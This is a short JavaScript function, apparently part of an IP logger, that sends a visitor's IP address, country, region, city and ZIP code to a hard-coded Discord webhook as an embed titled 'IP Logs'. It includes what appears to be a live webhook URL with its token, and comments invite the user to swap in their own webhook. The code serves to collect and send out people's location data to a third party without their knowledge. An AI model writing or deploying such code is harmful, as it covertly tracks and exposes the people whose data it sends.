function logs(json) 
{
     var request = new XMLHttpRequest();
     
     request.open("POST", "https://discord.com/api/webhooks/1197237585894969454/Eby3Wu3eRgBzaP3tK_1lSgTQYxkt1aMHa1U9DUdkOfEDilUVZ8mWgnqwYFupy43VFHl-");  // add webhook url in the ""

     request.setRequestHeader('Content-type', 'application/json');

     var params = 
     {
          username: "Nyzon & Crow",
          avatar_url: "", // Just Add an url to have an avatar on your webhook
          embeds: [
               {
                    title: "IP Logs",
                    color: 16777215,
                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
               }
          ]
     }

     request.send(JSON.stringify(params));
}